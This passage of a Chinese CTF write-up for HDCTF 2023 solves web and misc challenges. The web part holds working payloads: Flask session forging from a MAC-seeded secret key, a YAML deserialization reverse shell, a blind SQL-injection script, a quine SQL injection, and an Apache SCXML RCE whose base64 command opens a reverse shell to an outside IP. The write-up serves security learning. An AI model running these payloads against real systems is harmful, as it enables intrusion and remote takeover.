class="hljs-literal">True</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            flash(<span class="hljs-string">&#x27;No file part&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Empty file&quot;</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename):<br>            filename = secure_filename(file.filename)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;./uploads/&#x27;</span>):<br>                os.makedirs(<span class="hljs-string">&#x27;./uploads/&#x27;</span>)<br>            file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload successfully!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;van you see&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Auth bro&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwdpath = os.popen(<span class="hljs-string">&quot;pwd&quot;</span>).read()<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br></code></pre></td></tr></table></figure>
+
+<p>我们阅读一下read路由的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>m = re.findall(<span class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br><span class="hljs-keyword">if</span> m:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br><span class="hljs-keyword">if</span> n:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>res = urlopen(url)<br><span class="hljs-keyword">return</span> res.read()<br></code></pre></td></tr></table></figure>
+
+<p>我们发现获得的url会使用 <code>urlopen()</code>去读取指定url的内容，因此，我们可以url编码两次，第一次浏览器自动解码，然后获得被编码一次的url，这时可以绕过 <code>re.findall()</code>正则，<code>urlopen()</code>函数可以解析包含urlencode的网址，这样我们知道为什么可以两次编码绕过了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这一段代码，<code>random.seed()</code>函数将会指定一个随机数种子，如果是固定值的话，会产生伪随机，每次固定位置的随机数都是一样的</p>
+<blockquote>
+<p><code>uuid.getnode()</code>函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的</p>
+</blockquote>
+<p><code>uuid.getnode()</code>可以用来获取网口的mac地址，因此是一个固定值，会生成伪随机，我们需要获取到mac地址</p>
+<img src="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png" srcset="/img/loading.gif" lazyload alt="image-20230428113423797" style="zoom:33%;" />
+
+<p>我们可以使用：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address<br></code></pre></td></tr></table></figure>
+
+<p>获取 eth0 网卡的mac地址</p>
+<img src="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png" srcset="/img/loading.gif" lazyload alt="image-20230428113543582" style="zoom:33%;" />
+
+<p>这是16进制的值，于是我们可以使用脚本生成 <code>SECRET_KEY</code>的值了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br>random.seed(<span class="hljs-number">0x0242ac025164</span>)<br><span class="hljs-built_in">print</span>(random.random()*<span class="hljs-number">233</span>)<br><br><span class="hljs-comment"># 16.703189614984886</span><br></code></pre></td></tr></table></figure>
+
+<p>得到key，我们可以使用 session伪造脚本伪造session了</p>
+<p><img src="https://s2.loli.net/2023/04/28/uZD1X4zqpAjTcsU.png" srcset="/img/loading.gif" lazyload alt="image-20230428113758500"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br></code></pre></td></tr></table></figure>
+
+<p>这里主要利用 <code>boogipop</code>路由，<strong>yaml反序列化</strong></p>
+<p>这个暂时不太会，直接放payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">str</span><br>    args: []<br>    state: !!python/<span class="hljs-built_in">tuple</span><br>      - <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br>      - !!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">staticmethod</span><br>        args: []<br>        state:<br>          update: !!python/name:<span class="hljs-built_in">eval</span><br>          items: !!python/name:<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure>
+
+<p>我们将IP、port改为自己的，然后在服务器开启监听，上传这个文件，然后利用boogipop路由即可：</p>
+<p><img src="https://s2.loli.net/2023/04/28/chQam2LvRYqZUuD.png" srcset="/img/loading.gif" lazyload alt="image-20230428114313417"></p>
+<p>注意改一下session</p>
+<p><img src="https://s2.loli.net/2023/04/28/KZU5rnYScgzbHsA.png" srcset="/img/loading.gif" lazyload alt="image-20230428114353862"></p>
+<p>在	<code>/proc/1/environ</code> 发现flag</p>
+<h4 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h4><p><strong>robots.txt泄露</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>        <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>sql注入题目，username必须为admin，此处我们需要从密码着手</p>
+<p>但是注意看，过滤了 <code>in</code> ，意味着我们不能使用 <code>information_schema</code>库查询表名，列名</p>
+<p>我本来是想找一下除了<code>information_schema</code>库，还有哪些库能用来查询的，找了这么几个：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">mysql.innodb_table_stats<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br></code></pre></td></tr></table></figure>
+
+<p>这几个都能用来查询表名，此处我们可以使用下面两个，我们我们写脚本去查询表名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:28973&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>s = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;_.,&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/version()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # 10_2_32-mariadb</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/database()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # ciscn</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j)</span><br>        payload = <span class="hljs-string">&quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/table_schema/**/like/**/&#x27;ciscn&#x27;),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span>.<span class="hljs-built_in">format</span>(i, j)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: payload<br>        &#125;<br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;something&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;someting&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p>发现啥都查不出来。。</p>
+<p>实际上此处为一张空表，我们需要使用另一种做法(<strong>quine</strong>)</p>
+<p>重点的代码是这里：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <br></code></pre></td></tr></table></figure>
+
+<p>我们除了让输入的密码与真正的密码一致外，还可以让<strong>输入的结果与输出的结果相同</strong>，同样可以实现获得flag</p>
+<p>举个例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png" srcset="/img/loading.gif" lazyload alt="image-20230423152442610"></p>
+<p>输入和输出结果一致，从而可以绕过</p>
+<p>这里需要知道一下原理：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570#h2-9">从三道赛题再谈Quine trick</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/16467716.html">NSS日刷-[第五空间 2021]yet_another_mysql_injection-Qunie</a></p>
+<p>看着有点烧脑，其实就是套娃</p>
+<p>我们首先尝试一下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png" srcset="/img/loading.gif" lazyload alt="image-20230423153453045"></p>
+<p>输出是一个小数点 .</p>
+<p>我们尝试将 上一段代码中的小数点 <strong>.</strong> 替换为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">REPLACE(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)   <span class="hljs-comment">-- 这里使用双引号包裹，防止单双引号重叠</span><br></code></pre></td></tr></table></figure>
+
+<p>完整代码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png" srcset="/img/loading.gif" lazyload alt="image-20230423153432347"></p>
+<p>乍一看好像是一样的，但是单双引号有点区别，我们需要再套<code>REPLACE</code>替换一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png" srcset="/img/loading.gif" lazyload alt="image-20230423155242323"></p>
+<p>是真的麻烦。。</p>
+<p>基本上就是这种思路了</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="hljs-number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="hljs-operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="hljs-operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="hljs-keyword">UNION</span>(<span class="hljs-keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="hljs-type">CHAR</span>(<span class="hljs-number">34</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">37</span>),&quot;%&quot;)))#<span class="hljs-string">&#x27;)))#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/Qi3aLjHIevkZFd4.png" srcset="/img/loading.gif" lazyload alt="image-20230423155425281"></p>
+<h4 id="BabyJxVx"><a href="#BabyJxVx" class="headerlink" title="BabyJxVx"></a>BabyJxVx</h4><blockquote>
+<p>考点：Apache SCXML2 RCE</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCE分析</a></p>
+<p>暂时不懂为什么</p>
+<p>直接放payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">initial</span>=<span class="hljs-string">&quot;run&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">final</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;run&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">onexit</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">assign</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">onexit</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">final</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后上传到服务器上面，<code>poc.xml</code></p>
+<p>注意base64要替换为自己的vps信息，然后在服务器上开启监听：</p>
+<img src="https://s2.loli.net/2023/04/28/QkzTJGgnpCYmEwq.png" srcset="/img/loading.gif" lazyload alt="image-20230428115926577" style="zoom:50%;" />
+
+<p><img src="https://s2.loli.net/2023/04/28/iSUQgdNza9xtkAT.png" srcset="/img/loading.gif" lazyload alt="image-20230428120008392"></p>
+<p>然后命令执行得flag</p>
+<img src="https://s2.loli.net/2023/04/28/HD6uw28tZUVKPxk.png" srcset="/img/loading.gif" lazyload alt="image-20230428120105755" style="zoom:33%;" />
+
+
+
+
+
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h4><p>010打开，base64解码</p>
+<p><img src="https://s2.loli.net/2023/04/23/Cpm6MVAWPBNkRhn.png" srcset="/img/loading.gif" lazyload alt="image-20230423155953654"></p>
+<h4 id="MasterMisc"><a href="#MasterMisc" class="headerlink" title="MasterMisc"></a>MasterMisc</h4><p><img src="https://s2.loli.net/2023/04/23/PZ7zjbhpCr8K9IL.png" srcset="/img/loading.gif" lazyload alt="image-20230423160525223"></p>
+<p>打开发现有很多压缩包，</p>
+<p>百度查了一下，这种是<code>分卷压缩包</code>，我们可以在cmd中输入如下命令，合并为一个压缩包：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> /B topic.<span class="hljs-keyword">zip</span>.001+topic.<span class="hljs-keyword">zip</span>.002+topic.<span class="hljs-keyword">zip</span>.003+topic.<span class="hljs-keyword">zip</span>.004+topic.<span class="hljs-keyword">zip</span>.005+topic.<span class="hljs-keyword">zip</span>.006 topic.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/OTIaA9qfQHRj4Mr.png" srcset="/img/loading.gif" lazyload alt="image-20230423161002616"></p>
+<p>爆破一下找到压缩包密码，使用<code>foremost</code>分离图片：</p>
+<p>得到一个wav音频和一张绿色的图片，我们使用<code>Audacity</code>看一下频谱图：</p>
+<p><img src="https://s2.loli.net/2023/04/23/UKqwkQuHBLi73Sm.png" srcset="/img/loading.gif" lazyload alt="image-20230423161240384"></p>
+<p>找到一部分flag</p>
+<p>使用010修改绿色图片高度：</p>
+<p><img src="https://s2.loli.net/2023/04/23/Dkm7UM6NtRAZQIP.png" srcset="/img/loading.gif" lazyload alt="image-20230423161334548"></p>
+<p>得到另一部分flag，</p>
+<p>最后一部分在<code>topic.png</code>中找到：</p>
+<p><img src="https://s2.loli.net/2023/04/23/8dBH2RcpnGUzJWS.png" srcset="/img/loading.gif" lazyload alt="image-20230423161418358"></p>
+<p>NSSCTF{e67d8104-7536-4433-bfff-96759901c405}</p>
+<h4 id="ExtremeMisc"><a href="#ExtremeMisc" class="headerlink" title="ExtremeMisc"></a>ExtremeMisc</h4><p>一张 <code>IDAT.png</code> 首先使用 foremost分离一下，得到一个 <code>Dic.zip</code></p>
+<p>使用 <code>Ziperello</code>工具说没有加密，还以为是伪加密。。坑人</p>
+<p>其实这里的密码是字母（以前一般都是数字），使用<code>Archpr</code>爆破得到密码：<code>haida</code></p>
+<p>打开<code>Reverse.piz</code>：</p>
+<p><img src="https://s2.loli.net/2023/04/23/4gwfGaDMRi3b8nK.png" srcset="/img/loading.gif" lazyload alt="image-20230423173129578"></p>
+<p>很明显，这里每一个字节都需要反转一下，需要写个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/Reverse.piz&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>data = f.read()<br>fzip = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/fzip.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>s = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    tmp = <span class="hljs-built_in">int</span>((<span class="hljs-string">&quot;%02x&quot;</span> % i)[::-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>    s += <span class="hljs-built_in">bytes</span>([tmp])<br>    <span class="hljs-comment"># print(tmp.to_bytes(1, &#x27;little&#x27;))</span><br><br>fzip.write(s)<br><br>首先以二进制形式读取文件给data，然后遍历这些二进制字符串，<br>注意：<span class="hljs-built_in">int</span>((<span class="hljs-string">&quot;%02x&quot;</span> % i)[::-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  我们将二进制转化为<span class="hljs-number">16</span>进制然后宽度为<span class="hljs-number">2</span>，不够使用<span class="hljs-number">0</span>填充，<br>然后反转一下，并使用<span class="hljs-built_in">int</span>()函数转为<span class="hljs-number">10</span>进制<br>然后将<span class="hljs-number">10</span>进制数字转为字节<span class="hljs-built_in">bytes</span>([])进行拼接，最后以二进制格式写入<br></code></pre></td></tr></table></figure>
+
+<p>写这种编码转化的脚本不是很会，需要多学一学</p>
+<p><a target="_blank" rel="noopener" href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c03/p05_pack_unpack_large_int_from_bytes.html">字节到大整数的打包与解包</a></p>
+<p>然后再使用爆破zip，获得如下文件：</p>
+<p><img src="https://s2.loli.net/2023/04/23/IZ4RtANWpmS6jaX.png" srcset="/img/loading.gif" lazyload alt="image-20230423174633982"></p>
+<p>很明显，在<code>Plain.zip</code>中存在内容已知的 <code>secret.txt</code>文件，我们可以使用明文爆破，<code>ARCHPR</code>或<code>bkcrack</code></p>
+<p>这里我们选择 <code>bkcrack</code>速度快一点：</p>
